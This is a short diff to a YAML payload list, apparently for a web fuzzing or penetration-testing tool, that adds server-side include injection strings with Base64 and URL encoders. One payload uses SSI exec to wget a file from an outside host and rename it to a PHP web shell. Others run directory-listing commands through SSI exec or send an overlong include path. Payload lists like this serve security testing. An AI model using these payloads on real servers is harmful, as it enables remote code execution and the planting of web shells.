@@ -1,6 +1,9 @@
 payload:
-  - '<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->'
+  - '<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php"-->'
   - '<!--#echo var="DOCUMENT_URI" -->'
+  - '<!--#exec cmd="ls" -->'
+  - '<!--#exec cmd="dir" -->'
+  - '<!--#include file=”UUUUUUUU...UU”-->'
 encoder:
   - Base64Flat
   - Url
